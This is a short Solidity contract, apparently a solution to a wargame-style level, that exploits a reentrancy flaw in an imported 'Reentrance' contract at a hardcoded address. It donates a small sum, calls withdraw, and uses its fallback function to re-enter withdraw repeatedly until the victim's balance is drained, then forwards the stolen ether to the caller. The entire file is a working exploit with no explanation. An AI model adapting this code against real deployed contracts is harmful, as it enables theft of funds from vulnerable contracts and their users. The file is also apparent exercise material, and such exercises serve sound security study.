pragma solidity ^0.6.12;

import "./Reentrance.sol";

contract Attack_Reentrance {

    Reentrance public victim = Reentrance(payable(0x5106C13b2F6E1c449E064d8F41432919B81194FD));

    function attack() public payable {
        require(msg.value == 10000000000000, "Insufficient attack value!");
        victim.donate{value: msg.value}(address(this));
        victim.withdraw(10000000000000);
    }

    fallback () external payable {     
        if (address(victim).balance >= 10000000000000) {
            victim.withdraw(10000000000000);
        }
    }

    function withdraw () public {
        payable(msg.sender).call{value: address(this).balance}("");
    }
}

